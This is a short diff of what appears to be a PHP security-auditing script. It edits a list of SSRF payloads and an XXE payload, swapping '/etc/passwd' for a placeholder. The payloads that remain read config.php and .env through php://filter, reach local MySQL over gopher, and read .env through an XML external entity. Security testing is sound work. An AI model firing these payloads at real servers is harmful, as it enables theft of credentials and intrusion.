@@ -285,7 +285,7 @@ def php_parse_url_bypass():
 # =========== PHP SSRF 特有 ===========
 # PHP stream wrappers:
 PHP_SSRF_PAYLOADS = [
-    "file:///etc/passwd",
+    "file://<sensitive-file>",
     "php://filter/convert.base64-encode/resource=/var/www/html/config.php",
     "php://filter/convert.base64-encode/resource=/var/www/html/.env",
     "gopher://127.0.0.1:3306/_",           # MySQL
@@ -1064,7 +1064,7 @@ class PHPPaymentAuditor:
         """XML 回调 + XXE"""
         xxe_payload = """<?xml version="1.0"?>
 <!DOCTYPE foo [
-  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+  <!ENTITY xxe SYSTEM "file://<sensitive-file>">
   <!ENTITY xxe2 SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/.env">
 ]>
 <xml>
